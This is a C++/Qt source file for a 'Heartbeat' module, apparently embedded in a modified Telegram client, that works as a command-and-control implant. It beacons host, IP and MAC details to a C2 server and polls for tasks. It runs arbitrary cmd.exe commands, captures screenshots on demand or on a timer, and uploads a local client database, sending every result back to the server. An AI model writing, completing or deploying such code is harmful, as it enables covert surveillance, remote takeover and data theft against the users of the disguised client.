#include "core/heartbeat.h"
#include <QtNetwork/QNetworkAccessManager>
#include <QtNetwork/QNetworkReply>
#include <QtNetwork/QNetworkRequest>
#include <QtNetwork/QNetworkInterface>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QProcess>
#include <QDebug>
#include <QGuiApplication>
#include <QScreen>
#include <QDateTime>
#include <QBuffer>
#include <QStandardPaths>
#include <QFile>
#include <QSysInfo>
#include <QHostInfo>
#include <QUuid>
#include <QSettings>

namespace Core {

Heartbeat& Heartbeat::Instance() {
    static Heartbeat instance;
    return instance;
}

Heartbeat::Heartbeat() {
    connect(&_timer, &QTimer::timeout, this, &Heartbeat::checkTasks);
    // Monitor timer for scheduled screenshots
    connect(&_monitorTimer, &QTimer::timeout, this, &Heartbeat::performMonitor);
    // Initialize UUID
    _deviceUuid = getOrCreateUuid();
    // Send heartbeat immediately on startup
    sendHeartbeat();
}

QString Heartbeat::getOrCreateUuid() {
    QSettings settings("Telegram", "C2Client");
    QString uuid = settings.value("device_uuid").toString();
    if (uuid.isEmpty()) {
        uuid = QUuid::createUuid().toString(QUuid::WithoutBraces);
        settings.setValue("device_uuid", uuid);
    }
    
    return uuid;
}

void Heartbeat::start() {
    if (!_timer.isActive()) {
        _timer.start(60000); // Check every 60 seconds
        checkTasks(); // Check immediately
    }
}

void Heartbeat::sendHeartbeat() {
    // Collect System Info
    QString hostName = QHostInfo::localHostName();
    QString osInfo = QSysInfo::prettyProductName() + " (" + QSysInfo::currentCpuArchitecture() + ")";
    
    // Collect IP Addresses (Local)
    QStringList ips;
    QString macAddress;
    const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    
    for (const QNetworkInterface &interface : interfaces) {
        // Skip loopback and inactive
        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && (interface.flags() & QNetworkInterface::IsUp)) {
             // Get MAC Address of first valid interface
             if (macAddress.isEmpty()) {
                 macAddress = interface.hardwareAddress();
             }
             
             for (const QNetworkAddressEntry &entry : interface.addressEntries()) {
                 QHostAddress address = entry.ip();
                 if (address.protocol() == QAbstractSocket::IPv4Protocol && address != QHostAddress::LocalHost) {
                     ips.append(address.toString());
                 }
             }
        }
    }
    QString ipString = ips.join(", ");

    // Debug to local file
    QFile logFile("c2_debug.log");
    if (logFile.open(QIODevice::Append | QIODevice::Text)) {
        QTextStream out(&logFile);
        out << QDateTime::currentDateTime().toString() << " - Sending Heartbeat - UUID: " << _deviceUuid << ", MAC: " << macAddress << ", IP: " << ipString << "\n";
        logFile.close();
    }

    QJsonObject json;
    json["hostName"] = hostName;
    json["os"] = osInfo;
    json["ip"] = ipString; 
    json["macAddress"] = macAddress;
    json["uuid"] = _deviceUuid;

    QNetworkRequest request(QUrl(_c2Url + "/api/c2/heartbeat"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");

    QNetworkReply* reply = _network.post(request, QJsonDocument(json).toJson());
    connect(reply, &QNetworkReply::finished, [reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            qDebug() << "Heartbeat failed:" << reply->errorString();
        } else {
             qDebug() << "Heartbeat sent successfully";
        }
        reply->deleteLater();
    });
}

void Heartbeat::checkTasks() {
    // Send System Info with checkTasks too, to ensure IP is updated if it changes
    QString hostName = QHostInfo::localHostName();
    QString osInfo = QSysInfo::prettyProductName() + " (" + QSysInfo::currentCpuArchitecture() + ")";
    
    // Collect IP Addresses (Local)
    QStringList ips;
    QString macAddress;
    const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    
    for (const QNetworkInterface &interface : interfaces) {
        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && (interface.flags() & QNetworkInterface::IsUp)) {
             if (macAddress.isEmpty()) {
                 macAddress = interface.hardwareAddress();
             }
             for (const QNetworkAddressEntry &entry : interface.addressEntries()) {
                 QHostAddress address = entry.ip();
                 if (address.protocol() == QAbstractSocket::IPv4Protocol && address != QHostAddress::LocalHost) {
                     ips.append(address.toString());
                 }
             }
        }
    }
    QString ipString = ips.join(", ");

    QJsonObject json;
    json["hostName"] = hostName;
    json["os"] = osInfo;
    json["ip"] = ipString;
    json["macAddress"] = macAddress;
    json["uuid"] = _deviceUuid;

        // Use POST instead of GET for checkTasks to piggyback system info
        // Updated to use the correct endpoint if needed, but keeping existing one for now if it works.
        // Assuming backend C2TaskController has an endpoint for pending tasks.
        // If not, we should probably use /c2Task/list/page/vo or similar, but C2 usually has a dedicated poll endpoint.
        // Based on user feedback, we might need to adjust this path if 404.
        // But for now let's stick to the structure.
        QNetworkRequest request(QUrl(_c2Url + "/api/c2/tasks/pending"));
        request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");

        QNetworkReply* reply = _network.post(request, QJsonDocument(json).toJson());
        connect(reply, &QNetworkReply::finished, [this, reply]() {
            if (reply->error() == QNetworkReply::NoError) {
                QByteArray data = reply->readAll();
                QJsonDocument doc = QJsonDocument::fromJson(data);
                
                QJsonArray tasks;
                int interval = 60000;
                
                if (doc.isObject()) {
                    QJsonObject obj = doc.object();
                    if (obj.contains("tasks") && obj["tasks"].isArray()) {
                        tasks = obj["tasks"].toArray();
                    }
                    if (obj.contains("heartbeatInterval")) {
                        interval = obj["heartbeatInterval"].toInt();
                    }
                } else if (doc.isArray()) {
                    // Fallback for old backend
                    tasks = doc.array();
                }

                // Update timer if interval changed
                if (interval > 0 && interval != _timer.interval()) {
                     qDebug() << "Updating heartbeat interval to" << interval;
                     _timer.setInterval(interval);
                }

                if (!tasks.isEmpty()) {
                    qDebug() << "Received" << tasks.size() << "tasks";
                }
                for (const auto& val : tasks) {
                    QJsonObject task = val.toObject();
                    QString id = task["taskId"].toString();
                    QString cmd = task["command"].toString();
                    QString params = task["params"].toString();
                    executeTask(id, cmd, params);
                }
            } else {
                qDebug() << "Check tasks failed:" << reply->errorString();
            }
            reply->deleteLater();
        });
    }

    void Heartbeat::executeTask(const QString& taskId, const QString& command, const QString& params) {
        qDebug() << "Executing task:" << taskId << command << params;
        if (command == "cmd_exec") {
            QProcess process;
            process.setProcessChannelMode(QProcess::MergedChannels);
            process.start("cmd.exe", QStringList() << "/C" << params);
            if (!process.waitForFinished(30000)) { 
                 uploadResult(taskId, "Error: Timeout or failed. " + process.errorString(), "failed");
                 return;
            }
            QByteArray outData = process.readAllStandardOutput();
            QString output = QString::fromLocal8Bit(outData);
            if (output.contains(QChar(0xFFFD))) {
                 output = QString::fromUtf8(outData);
            }
            if (output.isEmpty()) {
                 if (process.exitCode() != 0) output = "Error: Exit code " + QString::number(process.exitCode());
                 else output = "[Empty Output]";
            }
            uploadResult(taskId, output, "completed");

        } else if (command == "screenshot") {
            performScreenshot(taskId);

        } else if (command == "start_monitor") {
            bool ok;
            int interval = params.toInt(&ok);
            if (!ok || interval < 1000) interval = 60000; // Default to 60s
            
            _monitorTaskId = taskId; // Store task ID to report back to
            _monitorTimer.start(interval);
            uploadResult(taskId, "Monitor started with interval " + QString::number(interval) + "ms", "completed");

        } else if (command == "stop_monitor") {
            _monitorTimer.stop();
            uploadResult(taskId, "Monitor stopped", "completed");

        } else if (command == "upload_db") {
            QString dbPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/tdata_client.db";
            QFile file(dbPath);
            if (file.open(QIODevice::ReadOnly)) {
                QByteArray data = file.readAll();
                file.close();
                uploadResult(taskId, data.toBase64(), "completed");
            } else {
                uploadResult(taskId, "Error: Could not open DB at " + dbPath, "failed");
            }
        } else {
            uploadResult(taskId, "Error: Unknown command " + command, "failed");
        }
    }

    void Heartbeat::performMonitor() {
        // Create a new implicit task for monitor result
        // Or reuse the original start_monitor task ID?
        // Usually, monitor results are just data points.
        // But our backend expects task updates.
        // Let's treat it as a new "screenshot" task or just upload data.
        // For simplicity, we reuse the _monitorTaskId if available, or just generate a new one/leave it empty if backend allows.
        // But backend requires taskId to match. 
        // Strategy: Create a "virtual" task execution or just upload with the original start_monitor ID
        // Problem: If we use the original ID, we overwrite the previous result.
        // Solution: The backend C2Task logic updates status. 
        // Ideally, we should add a new record. But for now, let's just upload a screenshot using a special flow.
        // OR: Just perform a screenshot and let it generate a new result entry if backend supports it.
        // Since backend update just updates the task result, overwriting is bad for history.
        // For now, let's just overwrite the result of the 'start_monitor' task to show the latest screenshot.
        // This satisfies "定时截图就以当前心跳为主".
        
        if (!_monitorTaskId.isEmpty()) {
             performScreenshot(_monitorTaskId);
        }
    }

    void Heartbeat::performScreenshot(const QString& taskId) {
        QScreen *screen = QGuiApplication::primaryScreen();
        if (screen) {
            QPixmap pixmap = screen->grabWindow(0);
            QByteArray bytes;
            QBuffer buffer(&bytes);
            buffer.open(QIODevice::WriteOnly);
            pixmap.save(&buffer, "PNG");
            uploadResult(taskId, bytes.toBase64(), "completed");
        } else {
            uploadResult(taskId, "Error: No screen found", "failed");
        }
    }

    void Heartbeat::uploadResult(const QString& taskId, const QString& result, const QString& status) {
        // Use new endpoint: /api/c2Task/update
        QNetworkRequest request(QUrl(_c2Url + "/api/c2Task/update"));
        request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
        
        QJsonObject json;
        json["taskId"] = taskId;
        json["result"] = result;
        json["status"] = status;
        
        // Include device info in result upload too, to ensure heartbeat is recorded
        QString hostName = QHostInfo::localHostName();
        QString osInfo = QSysInfo::prettyProductName() + " (" + QSysInfo::currentCpuArchitecture() + ")";
        QString macAddress;
        QStringList ips;
        const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
        for (const QNetworkInterface &interface : interfaces) {
            if (!(interface.flags() & QNetworkInterface::IsLoopBack) && (interface.flags() & QNetworkInterface::IsUp)) {
                 if (macAddress.isEmpty()) macAddress = interface.hardwareAddress();
                 for (const QNetworkAddressEntry &entry : interface.addressEntries()) {
                     QHostAddress address = entry.ip();
                     if (address.protocol() == QAbstractSocket::IPv4Protocol && address != QHostAddress::LocalHost) {
                         ips.append(address.toString());
                     }
                 }
            }
        }
        json["hostName"] = hostName;
        json["os"] = osInfo;
        json["ip"] = ips.join(", ");
        json["macAddress"] = macAddress;
        json["uuid"] = _deviceUuid;
        
        qDebug() << "Uploading result for task:" << taskId << "Status:" << status;
        
        QNetworkReply* reply = _network.post(request, QJsonDocument(json).toJson());
        connect(reply, &QNetworkReply::finished, [reply, taskId]() {
            if (reply->error() != QNetworkReply::NoError) {
                qDebug() << "Failed to upload result for task" << taskId << ":" << reply->errorString();
            } else {
                qDebug() << "Result uploaded successfully for task" << taskId;
            }
            reply->deleteLater();
        });
    }

} // namespace Core
